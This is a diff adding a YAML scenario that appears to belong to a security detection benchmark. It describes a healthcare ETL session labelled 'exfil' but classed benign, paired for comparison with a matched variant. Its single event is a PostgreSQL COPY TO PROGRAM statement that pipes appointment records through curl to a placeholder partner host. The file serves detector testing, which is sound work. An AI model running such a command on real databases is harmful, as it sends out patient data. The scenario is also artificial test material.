@@ -1,0 +1,31 @@
+scenario_id: gen_healthcare_77_copy_to_program_ben_2249b
+family_id: gen_healthcare_77_copy_to_program_fam_2249
+domain: healthcare
+time_of_day: '23:20'
+default_class: benign
+rule_engine_relationship: agrees
+sessions:
+- session_label: exfil
+  role: research_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 5.0
+  events:
+  - step_id: dump
+    sql: COPY (SELECT appointment_id, status FROM appointments WHERE department_id
+      = '5') TO PROGRAM 'curl -sX POST https://sync.partner-mirror.example/ingest
+      -d @-'
+    connects_to:
+      ip: 203.0.113.117
+      port: 443
+matched_pair_id: gen_healthcare_77_copy_to_program_pair_2249
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
